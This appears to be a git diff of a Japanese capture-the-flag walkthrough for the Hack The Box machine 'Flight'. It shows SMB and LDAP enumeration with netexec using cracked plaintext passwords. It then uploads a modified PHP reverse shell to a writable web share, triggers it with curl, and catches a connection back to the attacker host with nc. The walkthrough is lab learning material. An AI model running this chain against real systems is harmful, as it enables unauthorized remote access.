@@ -15,13 +15,14 @@ Open 10.129.200.222:593
 Open 10.129.200.222:636
 Open 10.129.200.222:3268
 Open 10.129.200.222:3269
+Open 10.129.200.222:5985
 Open 10.129.200.222:9389
 Open 10.129.200.222:49667
 Open 10.129.200.222:49673
 Open 10.129.200.222:49674
 Open 10.129.200.222:49695
 Open 10.129.200.222:49725
-10.129.200.222 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49695,49725]
+10.129.200.222 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49695,49725]
 ```
 
 
@@ -292,6 +293,13 @@ SVC_APACHE::flight:7480e093cd0cc6d2:875288c3e4026dc8af430f72bfabe029:01010000000
 
 
 ## STEP 4
+5985番は開いていたが、winrmログインできるユーザは存在しなかった
+```sh
+└─$ netexec ldap 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --groups 'Remote Management Users'
+LDAP        10.129.200.222  389    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)
+LDAP        10.129.200.222  389    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+LDAP        10.129.200.222  389    G0               [-] Group Remote Management Users has no members
+```
 smb列挙  
 readできるフォルダにめぼしい情報はなかった
 ```sh
@@ -489,10 +497,67 @@ SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019
 SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
 SMB         10.129.200.222  445    G0               [*] Copying "c.bum/desktop/user.txt" to "/home/kali/user.txt"
 SMB         10.129.200.222  445    G0               [+] File "c.bum/desktop/user.txt" was downloaded to "/home/kali/user.txt"
-                                                                                                                                                                       
+
 └─$ cat user.txt 
 d8b9ecfbaa5e71842169b964146d25ff
 ```
 
 
 ## STEP 6
+smb列挙  
+ユーザc.bumにはwebにwrite権限が付与されていた
+```sh
+└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --shares                                                               
+SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.200.222  445    G0               [*] Enumerated shares
+SMB         10.129.200.222  445    G0               Share           Permissions     Remark
+SMB         10.129.200.222  445    G0               -----           -----------     ------
+SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
+SMB         10.129.200.222  445    G0               C$                              Default share
+SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
+SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.200.222  445    G0               Shared          READ,WRITE      
+SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.200.222  445    G0               Users           READ            
+SMB         10.129.200.222  445    G0               Web             READ,WRITE
+```
+web内にはSTEP2から確認できるwebのファイルが確認できる  
+ここにphpリバースシェルを配置し、リバースシェルを取得する
+```sh
+└─$ smbclient -U 'flight.htb/c.bum%Tikkycoll_431012284' -c 'dir' //10.129.200.222/web
+  .                                   D        0  Wed Oct 15 07:32:00 2025
+  ..                                  D        0  Wed Oct 15 07:32:00 2025
+  flight.htb                          D        0  Wed Oct 15 07:32:00 2025
+  school.flight.htb                   D        0  Wed Oct 15 07:32:00 2025
+
+                5056511 blocks of size 4096. 1245515 blocks available
+```
+phpのリバースシェルだが、pentestmonkeyはwindows用ではなさそうだったため、ivan-sincekを使用する  
+リッスンipアドレスを変更して、school.flight.htb配下に転送し実行
+```sh
+└─$ wget -nv https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php
+2025-10-15 00:35:47 URL:https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php [9403/9403] -> "php_reverse_shell.php" [1]
+
+└─$ sed -i.bak "s/Shell('127\.0\.0\.1', 9000)/Shell('10.10.16.4', 4444)/g" php_reverse_shell.php
+
+└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share web --put-file '/home/kali/php_reverse_shell.php' '\school.flight.htb\shell.php'
+SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.200.222  445    G0               [*] Copying /home/kali/php_reverse_shell.php to \school.flight.htb\shell.php
+SMB         10.129.200.222  445    G0               [+] Created file /home/kali/php_reverse_shell.php on \\web\\school.flight.htb\shell.php
+
+└─$ curl 'http://school.flight.htb/shell.php'
+```
+svc_apacheのリバースシェル取得
+```sh
+└─$ rlwrap nc -lnvp 4444       
+listening on [any] 4444 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.129.200.222] 63803
+SOCKET: Shell has connected! PID: 7132
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\school.flight.htb>whoami
+flight\svc_apache
+```
